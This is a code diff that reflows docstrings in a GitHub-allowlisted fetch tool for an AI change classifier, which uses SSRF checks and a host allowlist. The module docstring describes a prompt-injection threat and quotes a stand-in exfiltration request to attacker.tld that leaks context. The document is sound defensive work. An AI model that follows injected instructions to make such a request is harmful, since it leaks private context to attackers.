@@ -1,15 +1,8 @@
 """GitHub-allowlisted enrichment fetch (MF2): pull ADDITIONAL context for a change from GitHub only.
 
-The threat model here is sharper than a normal fetch tool's: the change under classification is
-ATTACKER-AUTHORED, so an injected instruction could try to steer a fetcher into
-`GET https://attacker.tld/?leak=<context>`, a data-exfiltration channel. rlm-harness's SSRF guard blocks
-INTERNAL/metadata targets, but an attacker-EXTERNAL URL is its allowed case. So this wrapper adds a HOST
-ALLOWLIST on top: only GitHub API/content hosts are reachable, and there is no way to fetch a
-"referenced URL" the change names. Enrichment is OFF by default (`enable_fetch=False`) for the same
-reason: turn it on only when you need to pull the full file/commit context and trust the GitHub hosts.
+The threat model here is sharper than a normal fetch tool's: the change under classification is ATTACKER-AUTHORED, so an injected instruction could try to steer a fetcher into `GET https://attacker.tld/?leak=<context>`, a data-exfiltration channel. rlm-harness's SSRF guard blocks INTERNAL/metadata targets, but an attacker-EXTERNAL URL is its allowed case. So this wrapper adds a HOST ALLOWLIST on top: only GitHub API/content hosts are reachable, and there is no way to fetch a "referenced URL" the change names. Enrichment is OFF by default (`enable_fetch=False`) for the same reason: turn it on only when you need to pull the full file/commit context and trust the GitHub hosts.
 
-Base/wrap split: the SSRF primitives (`is_safe_url`, `resolved_host_is_safe`, `parse_cidrs`) are the kit's;
-this module owns the allowlist + the httpx provider + tracing. Sync (dspy invokes tools synchronously).
+Base/wrap split: the SSRF primitives (`is_safe_url`, `resolved_host_is_safe`, `parse_cidrs`) are the kit's; this module owns the allowlist + the httpx provider + tracing. Sync (dspy invokes tools synchronously).
 """
 
 from __future__ import annotations
@@ -37,17 +30,14 @@ def _port_for(parsed) -> int:
 
 
 def make_github_fetch_tool(config: DetectConfig) -> Callable[[str], str]:
-    """Build the sync `fetch_url(url)` tool, allowlisted to `config.github_hosts`. Refuses any non-GitHub
-    or internal target (an exfil attempt on attacker-authored input), then applies the kit's DNS-rebinding
-    resolved-IP re-check on every redirect hop."""
+    """Build the sync `fetch_url(url)` tool, allowlisted to `config.github_hosts`. Refuses any non-GitHub or internal target (an exfil attempt on attacker-authored input), then applies the kit's DNS-rebinding resolved-IP re-check on every redirect hop."""
     allowed_hosts = tuple(config.github_hosts)
     allow_nets = parse_cidrs(config.fetch_allow_cidrs)
     max_bytes = config.fetch_max_bytes
     timeout = config.fetch_timeout
 
     def fetch_url(url: str) -> str:
-        """Fetch ADDITIONAL context from GitHub (a full file, a commit, a PR page). Only GitHub hosts are
-        reachable; any other or internal URL is refused. Store the result in a REPL variable and slice it."""
+        """Fetch ADDITIONAL context from GitHub (a full file, a commit, a PR page). Only GitHub hosts are reachable; any other or internal URL is refused. Store the result in a REPL variable and slice it."""
         u = (url or "").strip()
         if not is_safe_url(u) or not _host_allowed(u, allowed_hosts):
             record_tool_call("fetch_url", args={"url": url}, ok=False,
